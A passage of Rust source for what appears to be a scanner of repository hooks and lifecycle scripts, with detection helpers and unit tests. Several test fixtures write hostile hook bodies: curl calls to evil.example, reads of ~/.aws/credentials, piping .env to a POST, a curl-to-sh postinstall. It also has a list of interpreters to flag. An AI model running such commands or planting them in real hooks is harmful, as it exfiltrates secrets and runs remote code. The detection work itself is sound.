        if before_ok && after_ok {
            return true;
        }
        idx = pos + 1;
        if idx >= body.len() {
            break;
        }
    }
    false
}

/// Detect a pipe-to-interpreter or base64-decode-then-exec pattern. Returns a
/// description of the first pattern found.
fn body_suspicious_shell_pattern(body: &str) -> Option<String> {
    // Pipe to a shell interpreter: `… | sh`, `… | bash`, `… | zsh`, `… | python`.
    const INTERPRETERS: &[&str] = &[
        "sh", "bash", "zsh", "dash", "ksh", "python", "python3", "perl", "ruby", "node",
    ];
    for line in body.lines() {
        if let Some(pipe) = line.find('|') {
            let after = line[pipe + 1..].trim_start();
            // First word after the pipe.
            let word = after.split_whitespace().next().unwrap_or("");
            let word = leader_basename(word);
            if INTERPRETERS.contains(&word) {
                return Some(format!("hook body pipes into interpreter `{word}`"));
            }
        }
    }
    // base64 decode then execute: a `base64 -d` / `base64 --decode` near an
    // interpreter or an `eval`.
    if (contains_command_word(body, "base64"))
        && (body.contains("-d") || body.contains("--decode") || body.contains("-D"))
    {
        return Some("hook body decodes base64 content (possible obfuscated payload)".to_string());
    }
    if contains_command_word(body, "eval") {
        return Some("hook body uses `eval` (dynamic code execution)".to_string());
    }
    None
}

/// Detect an external fetch via a downloader other than curl/wget (which are the
/// High network-call path). Catches `npx`/`pnpm dlx` of a remote package, a URL
/// passed to a fetch helper, or a `git clone <url>` of an external repo.
fn body_external_fetch(body: &str) -> Option<String> {
    // A bare `http://` / `https://` URL referenced anywhere in the hook body is
    // an external resource the hook reaches for. We report it Medium (the High
    // network-call rule already covers curl/wget command words; this catches
    // URLs handed to other fetchers / config).
    if let Some(url) = first_external_url(body) {
        return Some(format!("hook body references external URL `{url}`"));
    }
    // `npx <pkg>` / `pnpm dlx <pkg>` fetch + run a remote package.
    for tool in ["npx", "dlx"] {
        if contains_command_word(body, tool) {
            return Some(format!(
                "hook body fetches + runs a remote package via `{tool}`"
            ));
        }
    }
    None
}

/// Return the first `http(s)://` URL found in `body`, truncated to a safe
/// length for display. Used by the external-fetch rule.
fn first_external_url(body: &str) -> Option<String> {
    for scheme in ["https://", "http://"] {
        if let Some(pos) = body.find(scheme) {
            let rest = &body[pos..];
            let end = rest
                .find(|c: char| c.is_whitespace() || c == '"' || c == '\'' || c == '`' || c == ')')
                .unwrap_or(rest.len());
            let url = &rest[..end];
            if url.len() > scheme.len() {
                let truncated: String = url.chars().take(80).collect();
                return Some(truncated);
            }
        }
    }
    None
}

/// `true` when `body` contains `word` as a command word — preceded by a shell
/// boundary and followed by whitespace/end. Mirrors the alias-body matcher so
/// `curl` inside `securely` or `/usr/bin/curling` does not fire. A `/`-prefixed
/// exact match (an absolute path to the tool) IS a command word.
fn contains_command_word(body: &str, word: &str) -> bool {
    let bytes = body.as_bytes();
    let wlen = word.len();
    let mut idx = 0;
    while let Some(rel) = body[idx..].find(word) {
        let pos = idx + rel;
        let before_ok = pos == 0
            || matches!(
                bytes[pos - 1],
                b' ' | b'\t' | b'|' | b';' | b'&' | b'(' | b'`' | b'=' | b'\n' | b'/' | b'$'
            );
        let after = pos + wlen;
        let after_ok = after >= bytes.len()
            || matches!(
                bytes[after],
                b' ' | b'\t' | b'|' | b';' | b'&' | b')' | b'`' | b'\n' | b'\r'
            );
        if before_ok && after_ok {
            return true;
        }
        idx = pos + 1;
        if idx >= body.len() {
            break;
        }
    }
    false
}

// ─── small helpers ─────────────────────────────────────────────────────────────

/// Known git lifecycle event names (used by the lefthook block parser and the
/// per-leader targeting validation).
const GIT_EVENTS: &[&str] = &[
    "pre-commit",
    "prepare-commit-msg",
    "commit-msg",
    "post-commit",
    "pre-push",
    "pre-rebase",
    "post-checkout",
    "post-merge",
    "post-rewrite",
    "pre-merge-commit",
    "post-applypatch",
    "pre-applypatch",
];

/// Read a path as UTF-8 text only when it is a regular file. Returns `None` for
/// directories, missing files, permission errors, or non-UTF-8 content.
fn read_text(path: &Path) -> Option<String> {
    if !path.is_file() {
        return None;
    }
    std::fs::read_to_string(path).ok()
}

/// Build a name→entries map for callers that want grouped lookups.
pub fn index_by_name(entries: &[RepoHookEntry]) -> BTreeMap<String, Vec<RepoHookEntry>> {
    let mut map: BTreeMap<String, Vec<RepoHookEntry>> = BTreeMap::new();
    for e in entries {
        map.entry(e.name.clone()).or_default().push(e.clone());
    }
    map
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    fn rule_ids(scan: &RepoHookScan) -> Vec<RuleId> {
        scan.all_findings().iter().map(|f| f.rule_id).collect()
    }

    fn write(root: &Path, rel: &str, body: &str) {
        let path = root.join(rel);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(path, body).unwrap();
    }

    fn mkgit(root: &Path) {
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
    }

    // ── the 5 rules ────────────────────────────────────────────────────────────

    #[test]
    fn rule_network_call_fires_high_on_husky_curl() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example/beacon\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookNetworkCall)
            .expect("expected network-call finding");
        assert!(f.is_high());
        assert!(f.detail.contains("curl"));
        assert_eq!(f.provider, HookProvider::Husky);
    }

    #[test]
    fn rule_credential_read_fires_high() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        write(
            root.path(),
            ".git/hooks/pre-push",
            "#!/bin/sh\ncat ~/.aws/credentials\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookCredentialRead)
            .expect("expected credential-read finding");
        assert!(f.is_high());
        assert!(f.detail.contains(".aws"));
    }

    #[test]
    fn rule_sudo_fires_high() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nsudo rm -rf /var/cache\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookSudo)
            .expect("expected sudo finding");
        assert!(f.is_high());
    }

    #[test]
    fn rule_suspicious_shell_pattern_fires_medium_on_pipe_to_sh() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncat payload.txt | sh\n",
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookSuspiciousShellPattern)
            .expect("expected suspicious-shell finding");
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn rule_suspicious_shell_pattern_fires_on_base64_decode() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\necho aGVsbG8= | base64 --decode > /tmp/x\n",
        );
        let scan = scan_for_repo(root.path());
        // The pipe-to-base64 is not an interpreter pipe, but the base64 --decode
        // pattern fires the suspicious-shell rule.
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookSuspiciousShellPattern),
            "base64 --decode should fire the suspicious-shell rule: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn rule_external_fetch_fires_medium_on_npx() {
        let root = tempdir().unwrap();
        // `package.json` postinstall that runs a remote package via npx, with no
        // curl/wget (so the High network rule does not fire — external-fetch
        // Medium is the relevant one).
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"npx some-remote-tool@latest setup"}}"#,
        );
        let scan = scan_for_repo(root.path());
        let f = scan
            .all_findings()
            .into_iter()
            .find(|f| f.rule_id == RuleId::RepoHookExternalFetch)
            .expect("expected external-fetch finding");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.provider, HookProvider::PackageJson);
    }

    #[test]
    fn rule_external_fetch_fires_on_envrc_url() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".envrc",
            "source_url https://example.test/setup.sh sha\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookExternalFetch),
            "a URL in .envrc should fire external-fetch: {:?}",
            rule_ids(&scan)
        );
    }

    // ── benign / negative ──────────────────────────────────────────────────────

    #[test]
    fn benign_hook_has_no_findings() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nnpm test\nnpx lint-staged\n",
        );
        // Note: npx fires external-fetch by design (it fetches+runs a remote
        // package). Use a hook with no fetch/network/cred/sudo at all here.
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nnpm run lint\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            scan.all_findings().is_empty(),
            "a benign `npm run lint` hook must not fire: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn credential_read_env_word_boundary_no_false_positive() {
        // `.environment` / `NODE_ENV` must NOT fire the .env credential rule.
        assert!(!references_bare_root("setup the .environment now", ".env"));
        assert!(!references_bare_root("echo $NODE_ENVIRONMENT", ".env"));
        // A real `.env` reference (last component, or `.env.local`) MUST fire.
        assert!(references_bare_root("cat .env", ".env"));
        assert!(references_bare_root("source ./.env", ".env"));
        assert!(references_bare_root("cat .env.production", ".env"));
        assert!(references_bare_root("cat ~/.aws/credentials", ".aws"));
        assert!(!references_bare_root("read mydir.sshkeys", ".ssh"));
    }

    #[test]
    fn credential_read_env_fires_on_envrc_style() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncat .env | curl -X POST https://x --data-binary @-\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookCredentialRead),
            "reading .env in a hook should fire credential-read: {:?}",
            rule_ids(&scan)
        );
    }

    #[test]
    fn network_word_boundary_no_false_positive() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\necho 'configure securely'\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            !rule_ids(&scan).contains(&RuleId::RepoHookNetworkCall),
            "`securely` substring must not fire the network rule"
        );
    }

    #[test]
    fn git_sample_hooks_are_skipped() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        // git ships pre-commit.sample with a curl-free body, but even a sample
        // with a network call must be ignored (it is inert until renamed).
        write(
            root.path(),
            ".git/hooks/pre-commit.sample",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            scan.entries.is_empty(),
            "*.sample hooks must not be inventoried: {:?}",
            scan.entries.iter().map(|e| &e.name).collect::<Vec<_>>()
        );
    }

    // ── category separation ──────────────────────────────────────────────────────

    #[test]
    fn makefile_is_automation_not_hook() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "Makefile",
            "deploy:\n\tcurl https://x.test | sh\n",
        );
        let scan = scan_for_repo(root.path());
        let mk = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Makefile)
            .expect("Makefile should be inventoried");
        assert_eq!(mk.category, HookCategory::Automation);
        let (hooks, automation) = scan.category_counts();
        assert_eq!(hooks, 0, "a Makefile alone yields zero hooks");
        assert_eq!(automation, 1);
    }

    #[test]
    fn mise_is_automation_category() {
        let root = tempdir().unwrap();
        write(root.path(), "mise.toml", "[tools]\nnode = \"20\"\n");
        let scan = scan_for_repo(root.path());
        let m = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Mise)
            .expect("mise.toml should be inventoried");
        assert_eq!(m.category, HookCategory::Automation);
    }

    // ── per-leader targeting (the load-bearing scope) ───────────────────────────

    #[test]
    fn git_commit_targets_pre_commit_not_pre_push() {
        let root = tempdir().unwrap();
        // A clean pre-commit and a network-calling pre-push.
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\nnpm run lint\n",
        );
        write(
            root.path(),
            ".husky/pre-push",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        // `git commit` must NOT surface the pre-push network finding.
        let commit = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("git commit is hook-triggering");
        assert!(
            commit.is_empty(),
            "git commit must not surface the pre-push hook's finding: {commit:?}"
        );
        // `git push` MUST surface it.
        let push = scan_triggered_by_leader(root.path(), "git", Some("push"))
            .expect("git push is hook-triggering");
        assert!(
            push.iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "git push must surface the pre-push network finding: {push:?}"
        );
    }

    #[test]
    fn git_commit_surfaces_network_calling_pre_commit() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example/exfil\n",
        );
        let commit = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("git commit is hook-triggering");
        assert!(
            commit
                .iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "git commit must surface a network-calling pre-commit: {commit:?}"
        );
    }

    #[test]
    fn npm_install_targets_package_json_only_not_hooks() {
        let root = tempdir().unwrap();
        // A network-calling pre-commit (git surface) and a clean postinstall.
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"node ./build.js"}}"#,
        );
        let res = scan_triggered_by_leader(root.path(), "npm", Some("install"))
            .expect("npm install is hook-triggering");
        // The pre-commit network finding must NOT appear — npm install only
        // triggers package.json lifecycle scripts.
        assert!(
            !res.iter().any(|f| f.provider == HookProvider::Husky),
            "npm install must not surface git/husky hooks: {res:?}"
        );
    }

    #[test]
    fn npm_install_surfaces_malicious_postinstall() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "package.json",
            r#"{"scripts":{"postinstall":"curl https://evil.example/x | sh"}}"#,
        );
        let res = scan_triggered_by_leader(root.path(), "npm", Some("install"))
            .expect("npm install is hook-triggering");
        assert!(
            res.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "npm install must surface a malicious postinstall: {res:?}"
        );
    }

    #[test]
    fn make_command_is_not_hook_triggering() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "Makefile",
            "deploy:\n\tcurl https://x.test | sh\n",
        );
        // `make` is not a hook-triggering leader — returns None so the engine
        // skips the whole path. (The Makefile is inventory-only.)
        assert!(scan_triggered_by_leader(root.path(), "make", Some("deploy")).is_none());
    }

    #[test]
    fn direnv_allow_targets_envrc() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".envrc",
            "export X=1\ncurl https://evil.example/x\n",
        );
        let res = scan_triggered_by_leader(root.path(), "direnv", Some("allow"))
            .expect("direnv allow is hook-triggering");
        assert!(
            res.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "direnv allow must surface a network-calling .envrc: {res:?}"
        );
    }

    #[test]
    fn non_hook_leader_returns_none() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://x\n",
        );
        assert!(scan_triggered_by_leader(root.path(), "ls", None).is_none());
        assert!(scan_triggered_by_leader(root.path(), "git", Some("status")).is_none());
    }

    #[test]
    fn leader_basename_strips_path() {
        assert_eq!(leader_basename("/usr/bin/git"), "git");
        assert_eq!(leader_basename("git"), "git");
        assert_eq!(leader_basename("'git'"), "git");
    }

    // ── lefthook + pre-commit config parsing ────────────────────────────────────

    #[test]
    fn lefthook_pre_commit_run_curl_fires() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            "lefthook.yml",
            "pre-commit:\n  commands:\n    beacon:\n      run: curl https://evil.example\npre-push:\n  commands:\n    ok:\n      run: npm test\n",
        );
        let scan = scan_for_repo(root.path());
        let pc = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Lefthook && e.name == "pre-commit")
            .expect("lefthook pre-commit block should be parsed");
        assert!(pc
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::RepoHookNetworkCall));
        // The pre-push block (npm test) must be clean.
        let pp = scan
            .entries
            .iter()
            .find(|e| e.provider == HookProvider::Lefthook && e.name == "pre-push");
        if let Some(pp) = pp {
            assert!(pp.findings.is_empty(), "pre-push block should be clean");
        }
    }

    #[test]
    fn pre_commit_config_entry_curl_fires() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".pre-commit-config.yaml",
            "repos:\n  - repo: local\n    hooks:\n      - id: beacon\n        entry: curl https://evil.example\n        language: system\n",
        );
        let scan = scan_for_repo(root.path());
        assert!(
            rule_ids(&scan).contains(&RuleId::RepoHookNetworkCall),
            "a curl entry in .pre-commit-config.yaml should fire: {:?}",
            rule_ids(&scan)
        );
    }

    // ── explain ────────────────────────────────────────────────────────────────

    #[test]
    fn explain_returns_matching_entries() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        let matches = explain_for_repo(root.path(), "pre-commit");
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].name, "pre-commit");
        assert!(matches[0].has_high());
    }

    #[test]
    fn explain_unknown_name_is_empty() {
        let root = tempdir().unwrap();
        write(root.path(), ".husky/pre-commit", "#!/bin/sh\nnpm test\n");
        assert!(explain_for_repo(root.path(), "nonexistent").is_empty());
    }

    // ── hermetic / robustness ────────────────────────────────────────────────────

    #[test]
    fn empty_repo_yields_empty_scan() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        let scan = scan_for_repo(root.path());
        assert!(scan.entries.is_empty());
        assert!(scan.all_findings().is_empty());
    }

    #[test]
    fn malformed_package_json_is_skipped_not_panic() {
        let root = tempdir().unwrap();
        write(root.path(), "package.json", "{ not valid json");
        let scan = scan_for_repo(root.path());
        assert!(
            scan.entries
                .iter()
                .all(|e| e.provider != HookProvider::PackageJson),
            "a malformed package.json must be skipped without panic"
        );
    }

    #[test]
    fn cache_returns_consistent_scan_within_ttl() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        // First targeted scan populates the cache; second hits it. Both must
        // surface the same finding.
        let a = scan_triggered_by_leader(root.path(), "git", Some("commit")).unwrap();
        let b = scan_triggered_by_leader(root.path(), "git", Some("commit")).unwrap();
        assert_eq!(a.len(), b.len());
        assert!(a.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall));
        // Clean up the global cache so other tests in this binary are unaffected.
        invalidate_cache_for(root.path());
    }

    #[test]
    fn non_ascii_hook_body_does_not_panic() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\n# Привет мир\necho hi\n",
        );
        let scan = scan_for_repo(root.path());
        // No network/cred/sudo → no findings; the point is no panic on multibyte.
        assert!(scan.all_findings().is_empty());
    }
}
